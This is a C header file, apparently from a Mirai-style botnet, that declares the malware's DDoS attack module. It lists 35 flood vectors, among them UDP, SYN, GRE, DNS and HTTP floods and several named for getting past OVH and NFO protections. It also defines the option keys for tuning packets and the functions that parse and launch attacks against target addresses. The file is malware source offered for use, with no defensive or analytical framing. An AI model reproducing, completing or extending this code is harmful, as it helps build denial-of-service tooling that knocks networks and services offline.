#ifndef _ATTACK_H
#define _ATTACK_H

#include "includes.h"

/* Attack vectors */
#define ATK_VEC_UDP        0
#define ATK_VEC_VSE        1
#define ATK_VEC_DNS        2
#define ATK_VEC_SYN        3
#define ATK_VEC_ACK        4
#define ATK_VEC_STOMP      5
#define ATK_VEC_GREIP      6
#define ATK_VEC_GREETH     7
#define ATK_VEC_UDP_PLAIN  8
#define ATK_VEC_STD        9
#define ATK_VEC_XMAS       10
#define ATK_VEC_USYN       11
#define ATK_VEC_TCPALL     12
#define ATK_VEC_TCPFRAG    13
#define ATK_VEC_OVH        14
#define ATK_VEC_ASYN       15
#define ATK_VEC_NUDP       16
#define ATK_VEC_UDPHEX     17
#define ATK_VEC_HEX        18
#define ATK_VEC_STDHEX     19
#define ATK_VEC_SOCKET_RAW 20
#define ATK_VEC_SAMP       21
#define ATK_VEC_HTTP       22
#define ATK_VEC_HTTPS      23
#define ATK_VEC_CUDP       24
#define ATK_VEC_ICEE       25
#define ATK_VEC_RANDHEX    26
#define ATK_VEC_OVHUDP     27
#define ATK_VEC_NFO        28
#define ATK_VEC_OVHDROP    29
#define ATK_VEC_TCPMIX     30
#define ATK_VEC_TCPBYPASS  31
#define ATK_VEC_NFLAG      32
#define ATK_VEC_OVHNUKE    33
#define ATK_VEC_RAW        34
#define ATK_VEC_MAX        35

/* Attack options */
#define ATK_OPT_PAYLOAD_SIZE    0
#define ATK_OPT_PAYLOAD_RAND    1
#define ATK_OPT_IP_TOS          2
#define ATK_OPT_IP_IDENT        3
#define ATK_OPT_IP_TTL          4
#define ATK_OPT_IP_DF           5
#define ATK_OPT_SPORT           6
#define ATK_OPT_DPORT           7
#define ATK_OPT_DOMAIN          8
#define ATK_OPT_DNS_HDR_ID      9
#define ATK_OPT_TCP_URG         11
#define ATK_OPT_TCP_ACK         12
#define ATK_OPT_TCP_PSH         13
#define ATK_OPT_TCP_RST         14
#define ATK_OPT_TCP_SYN         15
#define ATK_OPT_TCP_FIN         16
#define ATK_OPT_TCP_SEQNUM      17
#define ATK_OPT_TCP_ACKNUM      18
#define ATK_OPT_GCIP            19
#define ATK_OPT_HTTP_METHOD     20
#define ATK_OPT_HTTP_POST_DATA  21
#define ATK_OPT_HTTP_PATH       22
#define ATK_OPT_CONNS           24
#define ATK_OPT_SOURCE          25
#define ATK_OPT_MINLEN          26
#define ATK_OPT_MAXLEN          27
#define ATK_OPT_PAYLOAD         28
#define ATK_OPT_REPEAT          29

/* Attack structures */
struct attack_target {
    struct in_addr addr;
    uint8_t netmask;
};

struct attack_option {
    uint8_t key;
    char *val;
};

struct attack_method {
    void (*func)(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
    uint8_t type;
};

/* Functions */
void attack_init(void);
void attack_kill_all(void);
void attack_parse(char *, int);
void attack_start(int, uint8_t, int, struct attack_target *, struct attack_option *);
char *attack_get_opt_str(int, struct attack_option *, int, uint8_t);
int attack_get_opt_int(int, struct attack_option *, int, uint8_t);
uint32_t attack_get_opt_ip(int, struct attack_option *, int, uint8_t);

#endif
